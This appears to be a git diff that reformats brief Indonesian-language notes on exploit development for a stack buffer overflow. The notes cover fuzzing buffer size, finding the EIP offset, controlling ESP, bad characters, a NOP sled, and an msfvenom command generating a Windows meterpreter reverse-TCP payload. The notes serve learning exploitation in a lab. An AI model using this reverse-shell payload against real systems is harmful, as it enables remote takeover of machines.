@@ -1,6 +1,9 @@
-Fuzz
-menetukan besar buffer = 2900
-menentukan offset eip, dimana eip mulai tertimpa data == jarak tertentu dari titik awal sebuah alamat memory = 2003
+# Exploit Development Steps
+
+## Fuzzing
+
+1. menetukan besar buffer = 2900
+2. menentukan offset eip, dimana eip mulai tertimpa data == jarak tertentu dari titik awal sebuah alamat memory = 2003
 
 Alamat memori adalah pengenal unik yang menentukan lokasi byte atau kata tertentu dalam memori. Alamat memori biasanya direpresentasikan sebagai nilai heksadesimal dan digunakan oleh CPU untuk mengakses dan memanipulasi data yang tersimpan dalam memori.
 
@@ -11,8 +14,10 @@ perhatikan esp tertimpa oleh payload kita == esp dapat kita control -> mencari i
 
 set breakpoit untuk memastikan kode yang bisa kita kontrol
 
-menentukan bad code----
+menentukan bad code
 
 memberikan nops sleed
 
+```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f python -b "\x00"
+```
